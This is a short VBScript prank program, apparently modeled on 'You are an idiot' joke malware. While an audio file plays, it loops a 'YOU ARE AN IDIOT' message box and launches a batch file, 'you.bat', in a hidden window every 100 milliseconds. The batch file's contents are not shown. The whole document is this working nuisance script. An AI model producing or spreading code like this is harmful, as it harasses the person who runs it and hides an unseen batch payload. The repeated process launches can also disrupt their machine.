Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")

' Play audio
oPlayer.URL = "you.mp3"
oPlayer.controls.play 
While oPlayer.playState <> 1 ' 1 = Stopped
X=MsgBox("YOU ARE AN IDIOT",0+48,"wenomechainsama.exe")
Set oShell = WScript.CreateObject("WScript.Shell")
Dim strArgs
strArgs = "cmd /c you.bat"
oShell.Run strArgs, 0, false
  WScript.Sleep 100
Wend
